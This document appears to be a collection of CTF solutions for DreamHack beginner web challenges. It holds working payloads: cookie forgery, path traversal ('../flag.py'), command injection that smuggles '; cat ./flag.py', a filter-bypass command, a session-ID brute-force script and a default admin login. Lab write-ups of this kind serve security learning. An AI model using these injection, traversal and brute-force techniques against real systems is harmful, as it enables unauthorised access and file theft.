# Beginner Levels — DreamHack

The levels in in the most solved to least order

## cookie

```bash
curl "http://host3.dreamhack.games:16771/" -b "username=admin"
```

## devtools-sources

Search `dh` in Sources -> webpack:// -> styles -> main.scss

## file-download-1

Payload `../flag.py`:

```
http://host8.dreamhack.games:13074/read?name=../flag.py
```

## command-injection-1

```bash
curl -X POST "http://host8.dreamhack.games:14311/ping" --data-urlencode 'host=0.0.0.0" ; cat ./flag.py #'
```

## Carve Party

Run:

```javascript
var pumpkin = [
  124, 112, 59, 73, 167, 100, 105, 75, 59, 23, 16, 181, 165, 104, 43, 49, 118,
  71, 112, 169, 43, 53,
];
var pie = 1;

for (var loop = 0; loop < 100; loop++) {
  for (var i = 0; i < pumpkin.length; i++) {
    pumpkin[i] ^= pie;

    pie = ((pie ^ 0xff) + i * 10) & 0xff;
  }
}

console.log(pumpkin.map((x) => String.fromCharCode(x)).join(""));
```

## ex-reg-ex

```
Input: dragonflye123am@gmail.com
```

## pathtraversal

```bash
curl -X POST http://host8.dreamhack.games:15671/get_info -d "userid=../flag"
```

## phpreg

```
Username: "dnnyangyang0310"
Password: "@12319!+1+13"
cmd: "cat ../dream/f${sh}lag.txt"
```

```bash
curl -X POST "http://host8.dreamhack.games:14342/step2.php" \
    --data-urlencode 'input1=dnnyangyang0310' \
    --data-urlencode 'input2=@12319!+1+13' \
    --data-urlencode 'cmd=cat ../dream/f${sh}lag.txt'
```

## Flying Chars

Run this in browser:

```javascript
window.requestAnimationFrame = () => {};

document.querySelectorAll("#box img").forEach((img) => {
  img.style.transform = "translateX(0px)";
});
```

The images will be organized in the correct order, format it based on the description.

## 🌱 simple-web-request

In step 1:

```
param: "getget"
param2: "rerequest"
```

In step 2:

```
param: "pooost"
param2: "requeeest"
```

## session

Solve script:

```python
import requests

target_url = "http://host8.dreamhack.games:19531/"

for i in range(256):
    session_id = f'{i:02x}'
    res = requests.get(target_url, cookies={"sessionid": session_id})
    print(f"Tried {session_id}")

    if "flag is" in res.text:
        print()
        print(f"Found {session_id}")
        print(res.text)
        break
```

## web-misconf-1

Logged in with:

```
Username: admin
Password: admin
```

Visit `/admin/settings` and find the `org_name`

## php7cmp4re

```
input_1: "7.:"
input_2: "8 "
```
